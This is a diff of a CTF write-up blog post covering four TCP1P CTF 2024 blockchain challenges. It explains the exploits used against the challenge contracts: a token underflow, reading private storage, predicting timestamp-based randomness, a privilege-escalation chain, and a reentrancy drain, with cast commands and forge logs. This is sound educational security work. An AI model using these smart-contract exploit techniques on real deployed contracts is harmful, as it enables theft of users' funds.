@@ -7,14 +7,16 @@ categories:
 author: Songhyun Bae
 ---
 
-On October 14, 2024, I participated in the TCP1P CTF 2024 with CyKor team and successfully solved 4 out of 6 blockchain challenges.
+Hello! This week, I participated in [TCP1P CTF 2024](https://ctftime.org/event/2256/) as a member of the [CyKor](https://x.com/cykorku). Since I’ve been particularly interested in blockchain lately, I focused on solving blockchain challenges during the competition.
+In the end, out of the 6 blockchain challenges, I managed to solve 4. In this post, I’ll be sharing my solutions to those problems. You can find all the challenges [here](https://github.com/TCP1P/TCP1P-CTF-2024-Challenges-Public).
 
-## **01. Baby ERC-20**
+---
+
+## 01. Baby ERC-20
 
 > New token standards huh? https://eips.ethereum.org/EIPS/eip-20
-> 
 
-In this challenge, there is an `HCOIN` contract that inherits from `Ownable`. The goal of this problem is to make the `_player` hold more than 1000 ether worth of `HCOIN`. The Setup contract is as follows:
+This challenge required finding a vulnerability in the HCOIN contract and obtaining more than 1,000 HCOIN. The setup contract was as follows:
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -43,8 +45,12 @@ contract Setup {
     }
 }
 ```
+<br>
 
-An interesting point here is that the Solidity version being used is `0.6.12`, which is quite old. This version does not include built-in protections against overflow and underflow vulnerabilities. As expected, there is an underflow vulnerability in the `HCOIN::transfer()` function.
+One interesting point was that the Solidity version used was 0.6.12, which is quite outdated. This version does not provide built-in protections against integer overflows and underflows, meaning such vulnerabilities could exist in the contract.
+<br>
+
+As expected, there was an underflow vulnerability in the `HCOIN::transfer()` function:
 
 ```solidity
 function transfer(address _to, uint256 _value) public returns (bool success) {
@@ -56,12 +62,31 @@ function transfer(address _to, uint256 _value) public returns (bool success) {
 	return true;
 }
 ```
+<br>
 
-The transfer function checks if the sender has enough funds using the require statement. However, the line `balanceOf[msg.sender] - _value` can cause an underflow if `_value` is larger than `balanceOf[msg.sender]`. In such a case, the underflow allows the require statement to pass. The subsequent operation `balanceOf[msg.sender] -= _value` causes the sender’s balance to underflow, increasing their balance due to the underflow bug.
+In the transfer function, there is a require check to ensure that the sender has a sufficient balance. However, due to the line:
+
+```solidity
+require(balanceOf[msg.sender] - _value >= 0, "Insufficient Balance");
+```
+
+if `_value` is greater than `balanceOf[msg.sender]`, an underflow occurs, allowing the require statement to pass. Additionally, `balanceOf[msg.sender] -= _value;` would cause the balance to underflow as well, leading to an unexpectedly large balance.
+<br>
+
+Another requirement to solve the challenge was to set our own address as the player by calling `setPlayer()` in the Setup contract:
+
+```solidity
+function setPlayer(address _player) public {
+    require(_player == msg.sender, "Player must be the same with the sender");
+    require(_player == tx.origin, "Player must be a valid Wallet/EOA");
+    player = _player;
+}
+```
+<br>
 
 ### Solution Script
 
-To solve this challenge, we can set the player using the setPlayer function and transfer `1 wei` to an arbitrary address to exploit the underflow and increase the player’s balance, solving the challenge.
+This is my Solution Script that implements the above solution.
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -106,28 +131,14 @@ contract SolveBabyERC is Script {
     }
 }
 ```
-```
-$ forge script SolveBabyERC
-[⠊] Compiling...
-[⠒] Compiling 23 files with Solc 0.6.12
-[⠔] Compiling 6 files with Solc 0.8.27
-[⠆] Solc 0.8.27 finished in 325.74ms
-[⠔] Solc 0.6.12 finished in 1.12s
-Script ran successfully.
-Gas used: 119416
-
-== Logs ==
-  Before Player Balance:  0
-  After Player Balance:  115792089237316195423570985008687907853269984665640564039457
-  isSolved:  true
-```
 <br>
-## **02. injus gambit**
+
+## 02. injus gambit
 
 > Inju owns all the things in the area, waiting for one worthy challenger to emerge. Rumor said, that there many ways from many different angle to tackle Inju. Are you the Challenger worthy to oppose him?
 > 
 
-In this challenge, the goal is to modify the challengeManager of the `Privileged` contract to `address(0)`. The Setup contract is as follows:
+This challenge required setting the `challengeManager` variable in the Privileged contract to `address(0)`. The setup contract was as follows:
 
 ```solidity
 // SPDX-License-Identifier: UNLICENSED
@@ -178,8 +189,21 @@ contract Challenger2 {
     }
 }
 ```
+<br>
 
-In the `ChallengeManager::challengeCurrentOwner` function, the `challengeManager` value of the `Privileged` contract can be changed. However, you need to know the `masterKey` and obtain the `theChallenger` role to do so.
+The `Privileged::fireManager` function sets `challengeManager` to `address(0)`. However, calling this function requires owner privileges.
+
+```solidity
+function fireManager() public onlyOwner{
+    challengeManager = address(0);
+}
+```
+<br>
+
+The ChallengeManager contract contained a function that allowed modifying the owner of the Privileged contract.
+<br>
+
+When the `ChallengeManager::challengeCurrentOwner` function is called, the `theChallenger` variable becomes the new owner. However, this function can only be called by theChallenger and requires the correct `_key` as an argument. In other words, we needed to obtain the masterKey and gain theChallenger privileges.
 
 ```solidity
 bytes32 private masterKey;
@@ -195,8 +219,9 @@ function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
     }        
 }
 ```
+<br>
 
-The `masterKey` is a private variable, but since it is stored in a storage slot, its value can be read by directly accessing the storage. The `masterKey` variable is found to be located in Slot 1.
+First, although `masterKey` is a private variable, in the EVM, all private variables are stored in storage slots. This means we can directly query the storage slot to retrieve its value. Using the `forge inspect` command, we can confirm that the `masterKey` variable is stored in slot 1.
 
 ```solidity
 $ forge inspect ChallengeManager storage-layout --pretty
@@ -213,14 +238,19 @@ $ forge inspect ChallengeManager storage-layout --pretty
 ```
 <br>
 
-You can retrieve the `masterKey` value using the following script.
+Next, using the `cast` command, we can query slot 1 of the Challenge contract and retrieve the `masterKey` value.
 
 ```solidity
-$ cast storage <ChallengeManager Address> 0 --rpc-url <Rpc Url>
+$ cast storage <ChallengeManager Address> 1 --rpc-url http://45.32.119.201:44445/79b1e60c-b236-4f69-80ae-c519d16b03a2
 0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559
 ```
+<br>
 
-To obtain the `theChallenger` role, you need to use the `upgradeChallengerAttribute` function. If you input the same `challengerId` for both `challengerId` and `strangerId`, where the Player is the `challenger`, and the gacha value is 0 or 1 four times consecutively, the `theChallenger` will be updated to the Player’s address.
+Now, if we can obtain Challenger privileges, we will be able to call the challengeCurrentOwner function.
+
+<br>
+
+To obtain `theChallenger` privileges, we need to use the `ChallengeManager::upgradeChallengerAttribute` function. However, there seem to be several conditions that must be met to successfully gain theChallenger status.
 
 ```solidity
 function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger {
@@ -271,10 +301,23 @@ function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) pu
     }
 }
 ```
+<br>
 
-Here, the `gacha` value is determined by `uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4`. Since the `block.timestamp` is a predictable value, it can be exploited to manipulate the outcome.
+Upon further analysis, if the player’s ID (where the player is the owner) is used as both `challengerId` and `strangerId`, and if the `gacha` value is 0 or 1 four times in a row, the theChallenger variable can be updated to the Player’s address.
+
+<br>
+
+Here, the gacha value is determined by:
+```solidity
+uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4
+```
+Since it relies on `block.timestamp`, it appears to be generated randomly. However, because `block.timestamp` is a predictable value, we can exploit this by ensuring our transaction executes only when the desired `gacha` value appears.
+
+<br>
 
 ### Solution Script
+
+Here is my Solution Script implementing the above approach.
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -372,11 +415,12 @@ contract AttackContract is Script {
 
 }
 ```
-```
+
+```solidity
 $ forge script SolveInjusGambit --broadcast --skip-simulation
 [⠊] Compiling...
 [⠒] Compiling 1 files with Solc 0.8.27
-[⠔] Solc 0.8.27 finished in 1.51s
+[⠑] Solc 0.8.27 finished in 1.51s
 Compiler run successful!
 Script ran successfully.
 Gas used: 677996
@@ -388,12 +432,13 @@ Gas used: 677996
   isSolved:  true
 ```
 <br>
-## **03. Executive Problem**
+
+## 03. Executive Problem
 
 > If only we managed to climb high enough, maybe we can dethrone someone?
-> 
 
-The goal of this challenge is to sequentially elevate the Player’s privileges and modify the `crain` value in the `Crain` contract. The Setup contract is as follows:
+
+The next challenge required sequentially escalating the Player’s privileges to eventually modify the `crain` value in the Crain Contract. The Setup Contract code is as follows:
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -417,8 +462,9 @@ contract Setup{
 
 }
 ```
+<br>
 
-The only function that can modify the crain value is `ascendToCrain`. This function can only be called from the `CrainExecutive` contract.
+The only function that can modulate the `crain` value is `Crain::ascendToCrain`. This function can only be called from a CrainExecutive Contract.
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -448,8 +494,9 @@ contract Crain{
     
 }
 ```
+<br>
 
-To call this function from the `CrainExecutive` contract, the `transfer` function must be used, and the `_message` argument can be utilized to perform a low-level function call. However, to invoke the `transfer` function, the `isExecutive` privilege must be obtained.
+In the CrainExecutive contract, we can likely use the `transfer` function to call the desired function. The transfer function executes a low-level call using the `_message` and `to` parameters provided by the user. This means we can set the `to` parameter as the Crain Contract address and craft the appropriate calldata to execute our desired action.
 
 ```solidity
 modifier _onlyExecutive(){
@@ -467,8 +514,13 @@ function transfer(address to, uint256 _amount, bytes memory _message) public _on
     require(transfered, "Failed to Transfer Credit!");
 }
 ```
+<br>
 
-To obtain the `isExecutive` privilege, you must first sequentially acquire the `isEmployee` and `isManager` privileges. Additionally, during this process, the `buyCredit` function must be used to increase the Player’s `balance`.
+However, we needed the isExecutive permission to call the transfer function.
+
+<br>
+
+To obtain `isExecutive` privileges, the player must first sequentially acquire `isEmployee` and `isManager` privileges. During this process, the `buyCredit` function must be used to increase the player’s balance. Since the challenge environment provides the player with sufficient ether, this step can be easily completed.
 
 ```solidity
 function becomeEmployee() public {
@@ -495,7 +547,11 @@ function buyCredit() public payable _onlyEmployee{
 }
 ```
 
+<br>
+
 ### Solution Script
+
+Here is my Solution Script implementing the approach described above.
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -547,11 +603,11 @@ contract SolveExecutiveProblem is Script {
 }
 ```
 
-```
+```solidity
 $ forge script SolveExecutiveProblem
 [⠊] Compiling...
-[⠒] Compiling 19 files with Solc 0.8.27
-[⠔] Solc 0.8.27 finished in 1.45s
+[⠔] Compiling 19 files with Solc 0.8.27
+[⠒] Solc 0.8.27 finished in 1.45s
 Compiler run successful!
 Script ran successfully.
 Gas used: 160223
@@ -559,16 +615,15 @@ Gas used: 160223
 == Logs ==
   isSolved:  true
 ```
-<br>
-## **04. Unsolveable Money Captcha**
+
+## 04. Unsolveable Money Captcha
 
 > Oh no! Hackerika just made a super-duper mysterious block chain thingy!
 I'm not sure what she's up to, maybe creating a super cool bank app?
 But guess what? It seems a bit wobbly because it's asking us to solve a super tricky captcha!
-What a silly kid! Let's help her learn how to make a super-duper awesome contract with no head-scratching captcha! XD
-> 
+What a silly kid! Let's help her learn how to make a super-duper awesome contract with no head-scratching captcha! XD 
 
-The goal of this challenge is to drain all the funds from the `moneyContract`. The Setup contract is as follows:
+In this challenge, the goal was to drain all funds from the moneyContract, which initially holds `10 ether`. The Setup Contract code is as follows:
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -590,8 +645,9 @@ contract Setup {
     }
 }
 ```
+<br>
 
-In the `Money` Contract, funds can be deposited using the `save` function and withdrawn using the `load` function.
+In the Money Contract, funds can be deposited using the `save` function and withdrawn using the `load` function.
 
 ```solidity
 function save() public payable {
@@ -611,16 +667,20 @@ function load(uint256 userProvidedCaptcha) public {
     balances[msg.sender] = 0;
 }
 ```
+<br>
 
-The load function contains a reentrancy attack vulnerability because it updates `balances[msg.sender]` after transferring the funds.
+However, the load function contains a reentrancy attack vulnerability. This is because it transfers funds using a low-level call before updating `balances[msg.sender]`.
 
 ```solidity
 (bool success,) = msg.sender.call{value: balance}("");
 require(success, 'Oh my god, what is that!?');
 balances[msg.sender] = 0;
 ```
+<br>
 
 ### Solution Script
+
+Here is my Solution Script that successfully executed the reentrancy attack and drained all funds from the moneyContract.
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -698,9 +758,8 @@ contract AttakContract {
     }
 }
 ```
-
-```
-$ forge script SolveUnsolveableMoneyCaptcha
+```solidity
+$ forge script SolveExecutiveProblem
 [⠊] Compiling...
 [⠔] Compiling 19 files with Solc 0.8.26
 [⠒] Solc 0.8.27 finished in 1.45s
